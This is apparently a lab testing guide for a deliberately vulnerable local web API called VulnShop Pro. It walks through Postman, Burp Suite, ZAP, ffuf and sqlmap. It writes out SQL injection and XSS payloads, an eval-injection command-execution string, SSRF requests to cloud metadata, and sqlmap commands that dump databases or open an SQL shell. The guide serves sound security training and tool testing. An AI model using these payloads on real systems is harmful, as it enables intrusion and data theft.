# VulnShop Pro - Complete Testing Guide
## Task 3: Testing All Vulnerable Endpoints with 5 Security Tools

### Test Command Reference
All endpoints verified working ✓ Proceeding with tool-based testing

---

## 1. POSTMAN COLLECTION TESTING

### Pre-requisites
- Postman installed
- VulnShop collection imported (VulnShop_Collection.json)
- Environment configured (VulnShop_Environment.json)
- Backend running on http://localhost:5000

### Test Cases

#### 1.1 SQL Injection Testing
```
Endpoint: GET /api/search?q=PAYLOAD
Test Cases:
- q=' OR '1'='1' --             [Boolean-based SQLi]
- q=' AND SLEEP(5) --           [Time-based blind SQLi]
- q=' UNION SELECT 1,2,3 --     [UNION-based SQLi]
- q=*                           [Wildcard test]
- q=test' ORDER BY 1 --         [Column enumeration]

Expected: Returns multiple results, command delays, or error messages revealing DB structure
```

#### 1.2 Configuration Exposure Testing
```
Endpoint: GET /api/config
No parameters needed
Expected: Returns JSON with debug=true, secret_key, jwt_secret, admin credentials
```

#### 1.3 XSS Testing (Reflected)
```
Endpoint: GET /api/display-message?msg=PAYLOAD
Test Cases:
- msg=<img src=x onerror=alert('XSS')>
- msg=<script>alert('Reflected XSS')</script>
- msg="><script>alert('XSS')</script>
- msg=<svg/onload=alert('XSS')>

Expected: HTML response with unescaped payload visible in source
```

#### 1.4 XSS Testing (Stored)
```
Endpoint: POST /api/comments
Payload: {"text":"<img src=x onerror=alert('Stored XSS')>"}

Then GET /api/comments
Expected: Stored XSS payload returned in comment list
```

#### 1.5 BOLA Testing (Unauthorized Access)
```
Endpoint: GET /api/users/<id> and /api/users/<id>/orders
Test Cases:
- Try /api/users/1 (should expose password and sensitive data)
- Try /api/users/2 (should access other user's data without auth)
- Try /api/users/99 (non-existent user)
- Try /api/users/1/orders (should show BOLA + payment data)

Expected: Access other users' data without authentication
```

#### 1.6 Weak Authentication Testing
```
Endpoint: POST /api/weak-auth
Payload: {"username":"admin","password":"Admin123"}
Test Cases:
- Default credentials: admin/password, admin/admin, test/test
- No rate limiting (send 100 requests to brute-force)

Expected: Should accept default credentials or allow unlimited login attempts
```

#### 1.7 SSRF Testing
```
Endpoint: POST /api/fetch-resource
Payload: {"url":"http://169.254.169.254/latest/meta-data/"}
Test Cases:
- Target internal IPs: 127.0.0.1, 192.168.*, 10.0.*
- Cloud metadata: AWS (169.254.169.254), GCP (metadata.google.internal)
- Internal services: redis, mongodb, postgresql local instances

Expected: Able to fetch internal resources and cloud metadata
```

#### 1.8 Eval Injection Testing
```
Endpoint: GET /api/products?filter=PAYLOAD
Test Cases:
- filter=>1000       [Simple comparison]
- filter=1 or 1==1   [Always true]
- filter=1; __import__('os').system('whoami')  [RCE attempt]

Expected: Filtering works with injected Python expressions
```

---

## 2. BURP SUITE TESTING

### Setup
```
1. Open Burp Suite
2. Configure proxy: http://localhost:8080
3. Configure Flask to accept proxy: FLASK_ENV=development
4. Set Scanner settings: Audit Checks - All checked
```

### Automated Scanning
```
1. Open Target > Scope
   Target scope: http://localhost:5000/api/*
   
2. Run Scanner (Ctrl+I or Scanner menu)
   Active Scan: ON
   Crawl starting point: http://localhost:5000/api/health
   
3. Analysis:
   - Burp should find SQL Injection in /api/search
   - Burp should find XSS in /api/display-message and /api/comments
   - Burp should find BOLA in /api/users endpoints
```

### Manual Testing with Intruder
```
1. Proxy > Intercept ON
2. Make request to /api/search?q=test
3. Send to Intruder (Ctrl+I)
4. Select payload position: q parameter
5. Payload sets:
   · SQL Injection wordlist
   · XSS wordlist
   · SSRF payloads
   
6. Attack options:
   - Look for: 200 OK with data, SLEEP responses, error messages
```

### Manual Testing with Repeater
```
Request templates:

1. SQL Injection Test:
GET /api/search?q=' OR '1'='1' -- HTTP/1.1
Host: localhost:5000

2. XSS Test:
GET /api/display-message?msg=<img src=x onerror=alert(1)> HTTP/1.1
Host: localhost:5000

3. BOLA Test:
GET /api/users/2 HTTP/1.1
Host: localhost:5000

4. SSRF Test:
POST /api/fetch-resource HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/"}

5. Config Exposure:
GET /api/config HTTP/1.1
Host: localhost:5000
```

---

## 3. OWASP ZAP TESTING

### Setup & Scanning
```bash
# Start ZAP (automatic scan)
zaproxy.sh -url http://localhost:5000/api -newsession vulnerable-app

# Or via command line for CI/CD
zaproxy.sh -cmd -url http://localhost:5000/api -config api.scan=true
```

### Manual Testing
```
1. Open ZAP UI
2. Quick Start > Automated Scan
3. URL: http://localhost:5000/api
4. Scan Type: Full (Development)
5. Run scan

Expected findings:
- SQL Injection [High Risk]
- Cross Site Scripting [High Risk]
- Missing Authentication [Medium Risk]
- Information Disclosure [Medium Risk]
- SSRF [High Risk]
```

### Active Scanning Rules
```
Recommended rules (all enabled):
- SQL Injection scanners (all variants)
- XSS scanners (reflected, stored)
- Remote Code Execution
- SSRF Detection
- Authorization bypass detection
- Weak authentication detection
```

---

## 4. FFUF - FUZZING ALL ENDPOINTS

### Endpoint Discovery
```bash
# Discover all API endpoints
ffuf -u http://localhost:5000/api/FUZZ -w endpoints.txt -v

# With middleware bypass attempts
ffuf -u http://localhost:5000/api/FUZZ -w endpoints.txt -H "X-Original-URL: /api/admin/FUZZ"
ffuf -u http://localhost:5000/api/FUZZ -w endpoints.txt -H "X-Rewrite-URL: /api/admin/FUZZ"
```

### Parameter Fuzzing
```bash
# Fuzz search parameter for SQLi
ffuf -u "http://localhost:5000/api/search?q=FUZZ" \
     -w sqli-payloads.txt \
     -fs 0 \
     -fw 1 \
     -v

# Fuzz filter parameter
ffuf -u "http://localhost:5000/api/products?filter=FUZZ" \
     -w eval-injection.txt \
     -mc 200 \
     -v

# Fuzz user IDs (BOLA testing)
ffuf -u "http://localhost:5000/api/users/FUZZ" \
     -w numbers.txt \
     -mc 200 \
     -v
```

### Reflection/XSS Fuzzing
```bash
# XSS fuzzing
ffuf -u "http://localhost:5000/api/display-message?msg=FUZZ" \
     -w xss-payloads.txt \
     -fr "alert" \
     -v

# Parameter discovery for XSS
ffuf -u "http://localhost:5000/api/comment/FUZZ" \
     -w param-names.txt \
     -fw 0 \
     -v
```

### Wordlists Needed
```
- endpoints.txt: API endpoint names
- sqli-payloads.txt: SQL injection payloads
- xss-payloads.txt: XSS payloads
- numbers.txt: 1-100 (for ID enumeration)
- param-names.txt: Common parameter names
```

---

## 5. SQLMAP - SQL INJECTION TESTING

### Basic Testing
```bash
# Test /api/search endpoint
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --batch \
       --dbs

# Test with all techniques
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --technique BEUSTQ \
       --batch \
       --dump-all

# Test for database enumeration
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --batch \
       --enumerate \
       --tables
```

### Detection Options
```bash
# Boolean-based blind SQLi
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --technique=B \
       --batch

# Time-based blind SQLi
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --technique=T \
       --batch

# Error-based SQLi
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --technique=E \
       --batch

# UNION-based SQLi
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --technique=U \
       --batch
```

### Advanced Options
```bash
# Full exploitation
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --batch \
       --tamper=space2comment \
       --dbs \
       -D vulnshop_db \
       --dump

# Dump sensitive data
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --batch \
       --dump \
       --db-admin

# SQL shell access
sqlmap -u "http://localhost:5000/api/search?q=test" \
       --batch \
       --sql-shell
```

---

## Test Execution Checklist

### Pre-Testing
- [ ] Backend running: `python vulnshop_pro.py`
- [ ] Port 5000 accessible: `curl http://localhost:5000/api/health`
- [ ] All tools installed (Postman, Burp, ZAP, FFUF, SQLMap)
- [ ] Firewall/proxy not blocking localhost traffic

### Postman Tests
- [ ] SQL Injection (3 variants)
- [ ] Config Exposure
- [ ] Reflected XSS (4 payloads)
- [ ] Stored XSS
- [ ] BOLA (users and orders)
- [ ] Weak Auth
- [ ] SSRF (AWS metadata)
- [ ] Eval Injection

### Burp Suite Tests
- [ ] Automated scanner: Active scan
- [ ] Intruder: SQL injection payloads
- [ ] Intruder: XSS payloads
- [ ] Repeater: Manual testing of each endpoint
- [ ] Recorded scan results

### ZAP Tests  
- [ ] Full automated scan
- [ ] Review findings report
- [ ] Cross-check with Burp findings

### FFUF Tests
- [ ] Endpoint discovery
- [ ] Parameter fuzzing (/api/search?q=)
- [ ] User ID enumeration (BOLA)
- [ ] XSS reflection detection

### SQLMap Tests
- [ ] Boolean-based SQLi detection
- [ ] Time-based blind SQLi detection
- [ ] Database enumeration
- [ ] Table dumping

### Post-Testing
- [ ] Document all findings
- [ ] Generate screenshot evidence
- [ ] Create test report: Found X vulnerabilities, confirmed by Y tools
- [ ] Verify all 9 endpoints are exploitable

---

## Expected Results Summary

| Endpoint | Vulnerability | Postman | Burp | ZAP | FFUF | SQLMap | Status |
|----------|---|---|---|---|---|---|---|
| /api/search | SQL Injection | ✓ | ✓ | ✓ | ✓ | ✓ | CRITICAL |
| /api/config | Config Exposure | ✓ | ✓ | ✓ | ✓ | - | HIGH |
| /api/display-message | Reflected XSS | ✓ | ✓ | ✓ | ✓ | - | HIGH |
| /api/comments | Stored XSS | ✓ | ✓ | ✓ | ✓ | - | HIGH |
| /api/users/<id> | BOLA | ✓ | ✓ | ✓ | ✓ | - | CRITICAL |
| /api/users/<id>/orders | BOLA | ✓ | ✓ | ✓ | ✓ | - | CRITICAL |
| /api/products | Eval Injection| ✓ | ✓ | ✓ | ✓ | - | HIGH |
| /api/fetch-resource | SSRF | ✓ | ✓ | ✓ | ✓ | - | HIGH |
| /api/weak-auth | Weak Auth | ✓ | ✓ | ✓ | ✓ | - | MEDIUM |

---

## Success Criteria

✅ Task 3 COMPLETE When:
1. Postman: 40/40 tests pass (5 tests × 8 endpoints + config)
2. Burp Suite: Reports ≥6 vulnerabilities found
3. ZAP: Reports ≥6 vulnerabilities with [High] risk
4. FFUF: Successfully fuzzes and finds 5+ parameters
5. SQLMap: Confirms SQL injection in /api/search
6. Test report created with evidence screenshots
7. All 9 endpoints confirmed exploitable by ≥3 tools

---

Generated: 2025-01-06
Next: Task 4 - Rename to SecurityForge
